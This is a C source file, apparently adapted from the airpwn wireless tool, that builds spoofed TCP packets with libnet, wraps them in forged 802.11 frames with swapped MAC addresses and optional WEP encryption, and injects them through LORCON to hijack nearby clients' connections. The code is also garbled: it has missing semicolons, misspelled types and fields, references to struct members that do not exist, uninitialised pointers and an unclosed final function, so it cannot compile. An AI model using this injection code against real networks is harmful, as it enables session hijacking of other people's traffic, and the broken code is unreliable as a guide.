#include <stdlib.h>
#include <libnet.h>

#ifndef IEEE80211_H

struct ieee80211_hdr {
      __le16 frame_ctl;
      __le16 duration_id;
      uint8_t payload[0];
} __attribute__ ((packed));


#else
	#include <ieee80211.h>
#endif

struct tcphdr {
	_be16 	source
	__be16 	dest
	__be32 	seq
	__be32 	ack_seq
	__be16 	window
	__sum16	check
	__be16 	urg_ptr		
}

struct iphdr {
  #if defined(__LITTLE_ENDIAN_BITFIELD)
       __u8    ihl:4,
           version:4;
   #elif defined (__BIG_ENDIAN_BITFIELD)
       __u8    version:4,
           ihl:4;
   #else
   #error  "Please fix <asm/byteorder.h>"
   #endif
       __u8    tos;
       __be16  tot_len;
       __be16  id;
       __be16  frag_off;
       __u8    ttl;
       __u8    protocol;
       __sum16 check;
       __be32  saddr;
       __be32  daddr;
       /*The options start here. */
  };
  
struct tx80211_packet {
	uint8_t modulation;
	uint8_t txrate;
	uint8_t *packet;
	int plen;
};

struct tx80211 {
	/* 
	 * Internal functions and structs 
	 *
	 * These should not be called directly.
	 */

	int injectortype;
	char ifname[32];
	uint32_t capabilities;
	int raw_fd;
	int ioctl_fd;
	int packets_sent;
	int packets_recv;

	int dlt;

	int mode;
	int channel;
	int rate;

	/* Error buffer */
	char errstr[1];

	/* Record the starting MAC address to restore if changed */
	uint8_t startingmacset;
	uint8_t startingmac[6];

	/* Extra space for use by the driver code */
	void *extra;

	/* Callthroughs to functions installed by the setup when the injector is
	 * defined. */
	int (*open_callthrough) (struct tx80211 *);
	int (*close_callthrough) (struct tx80211 *);

	int (*setmode_callthrough) (struct tx80211 *, int);
	int (*getmode_callthrough) (struct tx80211 *);

	int (*setfuncmode_callthrough) (struct tx80211 *, int);

	int (*setchan_callthrough) (struct tx80211 *, int);
	int (*getchan_callthrough) (struct tx80211 *);

	int (*txpacket_callthrough) (struct tx80211 *, struct tx80211_packet *);

	int (*selfack_callthrough) (struct tx80211 *, uint8_t *);
};

struct wepkey {
  uint8_t key[13];
  uint32_t keylen;
  struct wepkey *next;
};

struct wpakey {
  uint8_t ket[64];
  uint8_t keylen;
  int type; //CCMP -> 0 || TKIP -> 1 
  uint8_t handshake;   
};
  
struct choose{
	wpakey wpakeys;	
	wepkey wepkeys;	
}

struct airpwn_ctx {
  conf_entry *conf_list;
  char *monitor_if;
  char *control_if;
  char *inject_if;
  libnet_ptag_t tcp_t;
  libnet_ptag_t ip_t;
  libnet_t *lnet;
  unsigned int verbosity;
  FILE *logfile;
  wepkey *keys;
  wpalkey *wpakey;
  uint16_t iface_mtu;
  uint8_t fcs_present;
  //LORCON structs
  struct tx80211 monitor_tx;
  struct tx80211 control_tx;
  struct tx80211 inject_tx;
  struct tx80211_packet in_packet;
};

// FUNCTIONS
airpwn_ctx *spawn_Airpwn(void){
  	struct airpwn_ctx *c =  (sizeof airpwn_ctx *) malloc(sizeof(struct airpwn_ctx));
	 c->keys = NULL;
   	 c->wpakey  = NULL;
  	 c->status = NULL;
	 c->algorithm = NULL;
	 return c;	
}

void 
inject_tcp(airpwn_ctx *ctx,
								ieee80211_hdr *w_hdr,
								struct iphdr *ip_hdr,
								struct tcphdr *tcp_hdr,
								uint8_t *wepkey,
								uint32_t keylen,
								char *content,
								uint32_t contentlen,
								uint8_t tcpflags,
								uint32_t *seqnum)
{

  // libnet wants the data in host-byte-order
  u_int ack = ntohl(tcp_hdr->seq) + 
    ( ntohs(ip_hdr->tot_len) - ip_hdr->ihl * 4 - tcp_hdr->doff * 4 );
  
  ctx->tcp_t = libnet_build_tcp(
    ntohs(tcp_hdr->dest), // source port
    ntohs(tcp_hdr->source), // dest port
    *seqnum, // sequence number
    ack, // ack number
    tcpflags, // flags
    0xffff, // window size
    0, // checksum
    0, // urg ptr
    20 + contentlen, // total length of the TCP packet
    (uint8_t*)content, // response
    contentlen, // response_length
    ctx->lnet, // libnet_t pointer
    ctx->tcp_t // ptag
  );

  if(ctx->tcp_t == -1){
    printf("libnet_build_tcp returns error: %s\n", libnet_geterror(ctx->lnet));
    return;
  }

  ctx->ip_t = libnet_build_ipv4(
    40 + contentlen, // length
    0, // TOS bits
    1, // IPID (need to calculate)
    0, // fragmentation
    0xff, // TTL
    6, // protocol
    0, // checksum
    ip_hdr->daddr, // source address
    ip_hdr->saddr, // dest address
    NULL, // response
    0, // response length
    ctx->lnet, // libnet_t pointer
    ctx->ip_t // ptag
  );

  if(ctx->ip_t == -1){
    printf("libnet_build_ipv4 returns error: %s\n", libnet_geterror(ctx->lnet));
    return;
  }

  // copy the libnet packets to to a buffer to send raw..
  
  unsigned char packet_buff[0x10000];

  memcpy(packet_buff, w_hdr, IEEE80211_HDR_LEN);

  ieee80211_hdr *n_w_hdr = (ieee80211_hdr *)packet_buff;

  // set the FROM_DS flag and swap MAC addresses
  n_w_hdr->flags = IEEE80211_FROM_DS;
  if(wepkey)
    n_w_hdr->flags |= IEEE80211_WEP_FLAG;
  n_w_hdr->llc.type = LLC_TYPE_IP;

  uint8_t tmp_addr[6];
  memcpy(tmp_addr, n_w_hdr->addr1, 6);
  memcpy(n_w_hdr->addr1, n_w_hdr->addr2, 6);
  memcpy(n_w_hdr->addr2, tmp_addr, 6);
    
  u_int32_t packet_len;
  u_int8_t *lnet_packet_buf;
  
  // cull_packet will dump the packet (with correct checksums) into a
  // buffer for us to send via the raw socket
  if(libnet_adv_cull_packet(ctx->lnet, &lnet_packet_buf, &packet_len) == -1){
    printf("libnet_adv_cull_packet returns error: %s\n", 
			libnet_geterror(ctx->lnet));
    return;
  }

  memcpy(packet_buff + IEEE80211_HDR_LEN, lnet_packet_buf, packet_len);

  libnet_adv_free_packet(ctx->lnet, lnet_packet_buf);

  // total packet length
  int len = IEEE80211_HDR_LEN + 40 + contentlen;
  
  if(wepkey){
    uint8_t tmpbuf[0x10000];
    /* encryption starts after the 802.11 header, but the LLC header
     * gets encrypted. */
    memcpy(tmpbuf, packet_buff+IEEE80211_HDR_LEN_NO_LLC, 
			len-IEEE80211_HDR_LEN_NO_LLC);
    len = wep_encrypt(tmpbuf, packet_buff+IEEE80211_HDR_LEN_NO_LLC,
			len-IEEE80211_HDR_LEN_NO_LLC, wepkey, keylen);
    if(len <= 0){
      fprintf(stderr, "Error performing WEP encryption!\n");
      return;
    } else
      len += IEEE80211_HDR_LEN_NO_LLC;
  }

  /* Establish lorcon packet transmission structure */
  ctx->in_packet.packet = packet_buff;
  ctx->in_packet.plen = len;

  /* Send the packet */
  if (tx80211_txpacket(&ctx->inject_tx, &ctx->in_packet) < 0) {
    fprintf(stderr, "Unable to transmit packet.");
    perror("tx80211_txpacket");
    return;
  }

  *seqnum += contentlen;  //advance the sequence number
  
  printlog(ctx, 2, "wrote %d bytes to the wire(less)\n", len);
}

int perl_inject_tcp(int ch, key, keylen,  char *content, uint32_t contentlen, uint8_t tcpflags, uint32_t *seqnum){
	if(ch == 1 ){
		struct ieee80211_hdr *w_hdr;
		struct iphdr *ip_hdr;
		struct tcphdr *tcp_hdr;
		airpwn_ctx *ctx
		ctx->wpakey = key;
		inject_tcp(ctx,w_hdr,ip_hdr,tcp_hdr, key, keylen, content, contentlen, tcpflags, seqnum);
	
}else{
                struct ieee80211_hdr *w_hdr;
		struct iphdr *ip_hdr;
		struct tcphdr *tcp_hdr;
		airpwn_ctx *ctx
		ctx->wepkey = key;
		inject_tcp(ctx,w_hdr,ip_hdr,tcp_hdr, key, keylen, content, contentlen, tcpflags, seqnum);
		
	}
